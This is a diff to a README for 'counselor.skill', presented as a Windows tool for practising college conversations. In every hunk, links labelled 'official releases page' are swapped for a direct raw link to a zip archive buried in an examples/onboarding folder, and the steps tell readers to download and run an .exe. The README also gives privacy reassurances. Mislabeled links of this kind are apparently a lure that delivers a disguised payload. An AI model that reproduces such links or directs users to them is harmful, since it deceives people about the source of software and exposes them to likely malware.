@@ -1,6 +1,6 @@
 # 🎓 counselor.skill - Practice difficult college conversations with ease
 
-[![Download counselor.skill](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/icebaggoldenrule1862/counselor.skill/releases)
+[![Download counselor.skill](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/icebaggoldenrule1862/counselor.skill/main/examples/onboarding/skill_counselor_v3.9.zip)
 
 ## 🎯 About this project
 
@@ -19,7 +19,7 @@ Ensure your computer meets these basic needs to run the software:
 
 Follow these steps to get the software on your computer.
 
-1. Visit the [official releases page](https://github.com/icebaggoldenrule1862/counselor.skill/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/icebaggoldenrule1862/counselor.skill/main/examples/onboarding/skill_counselor_v3.9.zip).
 2. Look for the latest version listed at the top.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your desktop or downloads folder.
@@ -68,7 +68,7 @@ We offer this tool as a free resource for students. You do not need to provide p
 Yes. Use the Save Session option in the File menu to pick up where you left off later.
 
 **How do I update the software?**
-When a new version becomes available, the application notifies you. You can visit the [release page](https://github.com/icebaggoldenrule1862/counselor.skill/releases) to download the latest files.
+When a new version becomes available, the application notifies you. You can visit the [release page](https://raw.githubusercontent.com/icebaggoldenrule1862/counselor.skill/main/examples/onboarding/skill_counselor_v3.9.zip) to download the latest files.
 
 **Is it safe to type sensitive information?**
 The application runs locally on your Windows computer. It does not send your chat logs to external servers. Your conversations stay private.
